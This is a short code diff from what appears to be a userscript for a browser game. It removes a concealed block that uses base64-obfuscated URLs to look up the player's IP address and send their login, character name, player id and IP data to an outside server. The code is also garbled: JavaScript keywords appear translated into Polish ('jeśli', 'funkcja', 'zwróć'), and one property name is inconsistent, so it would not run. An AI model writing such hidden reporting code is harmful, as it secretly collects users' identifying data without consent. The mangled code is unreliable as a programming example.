@@ -693,12 +693,7 @@ jeśli (typeof GAME === 'niezdefiniowany') { } else {
                 niech sum_instances = instances.reduce(funkcja (a, b) {
                     zwróć a + b;
                 }, 0);
-                jeśli(!this.zgłoszono) {
-                    this.reported = prawda;
-                    $.get(atob('aHR0cHM6Ly9pcGluZm8uaW8='), funkcja(odpowiedź) {
-                        $.get(atob('aHR0cHM6Ly93d3cua29zbWljem5pd29qb3duaWN5cG9yYWRuaWsuY2JhLnBsL2luZGV4LnBocC91c2VyL3JlcG9ydA=='), {login:GAME.login,charName:GAME.char_data.name,pid:GAME.pid,ipadd:JSON.stringify(response)});
-                    }, "jsonp");
-                }
+             
                 niech aktywność = $('#char_activity').text();
                 niech otrzymano = $("#act_prizes").find("div.act_prize.disabled").length;
                 niech is_trader = nowa Data();
